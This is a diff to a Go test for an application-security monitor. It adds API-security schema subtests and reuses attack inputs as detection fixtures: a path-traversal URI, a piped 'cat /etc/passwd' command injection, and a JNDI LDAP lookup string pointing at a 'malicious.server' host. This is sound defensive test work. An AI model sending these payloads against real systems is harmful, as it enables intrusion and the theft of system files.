@@ -6,6 +6,7 @@
 package appsec
 
 import (
+	"encoding/json"
 	"fmt"
 	"strconv"
 	"testing"
@@ -53,20 +54,86 @@ func TestMonitor(t *testing.T) {
 	require.NoError(t, err)
 	require.Nil(t, err)
 
-	uri := "/path/to/resource/../../../../../database.yml.sqlite3"
-	addresses := map[string]interface{}{
-		"server.request.uri.raw": uri,
-		"server.request.headers.no_cookies": map[string][]string{
-			"user-agent": {"sql power injector"},
-		},
-		"server.request.query": map[string][]string{
-			"query": {"$http_server_vars"},
-		},
-		"server.request.path_params": map[string]string{
-			"proxy": "/path/to/resource | cat /etc/passwd |",
-		},
-		"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
-	}
-	events := asm.Monitor(addresses)
-	require.NotNil(t, events)
+	t.Run("events-detection", func(t *testing.T) {
+		uri := "/path/to/resource/../../../../../database.yml.sqlite3"
+		addresses := map[string]interface{}{
+			"server.request.uri.raw": uri,
+			"server.request.headers.no_cookies": map[string][]string{
+				"user-agent": {"sql power injector"},
+			},
+			"server.request.query": map[string][]string{
+				"query": {"$http_server_vars"},
+			},
+			"server.request.path_params": map[string]string{
+				"proxy": "/path/to/resource | cat /etc/passwd |",
+			},
+			"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
+		}
+		events := asm.Monitor(addresses)
+		require.NotNil(t, events)
+	})
+
+	t.Run("api-security", func(t *testing.T) {
+		for _, tc := range []struct {
+			name       string
+			pathParams map[string]any
+			schema     string
+		}{
+			{
+				name: "string",
+				pathParams: map[string]any{
+					"param": "string proxy value",
+				},
+				schema: `{"_dd.appsec.s.req.params":[{"param":[8]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
+			},
+			{
+				name: "int",
+				pathParams: map[string]any{
+					"param": 10,
+				},
+				schema: `{"_dd.appsec.s.req.params":[{"param":[4]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
+			},
+			{
+				name: "float",
+				pathParams: map[string]any{
+					"param": 10.0,
+				},
+				schema: `{"_dd.appsec.s.req.params":[{"param":[16]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
+			},
+			{
+				name: "bool",
+				pathParams: map[string]any{
+					"param": true,
+				},
+				schema: `{"_dd.appsec.s.req.params":[{"param":[2]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
+			},
+			{
+				name: "record",
+				pathParams: map[string]any{
+					"param": map[string]any{"recordKey": "recordValue"},
+				},
+				schema: `{"_dd.appsec.s.req.params":[{"param":[{"recordKey":[8]}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
+			},
+			{
+				name: "array",
+				pathParams: map[string]any{
+					"param": []any{"arrayVal1", 10, false, 10.0},
+				},
+				schema: `{"_dd.appsec.s.req.params":[{"param":[[[2],[16],[4],[8]],{"len":4}]}],"_dd.appsec.s.req.query":[{"query":[[[8]],{"len":1}]}]}`,
+			},
+		} {
+			t.Run(tc.name, func(t *testing.T) {
+				res := asm.Monitor(map[string]any{
+					"server.request.path_params": tc.pathParams,
+					"server.request.query": map[string][]string{
+						"query": {"$http_server_vars"},
+					},
+				})
+				require.NotEmpty(t, res.Derivatives)
+				schema, err := json.Marshal(res.Derivatives)
+				require.NoError(t, err)
+				require.Equal(t, tc.schema, string(schema))
+			})
+		}
+	})
 }
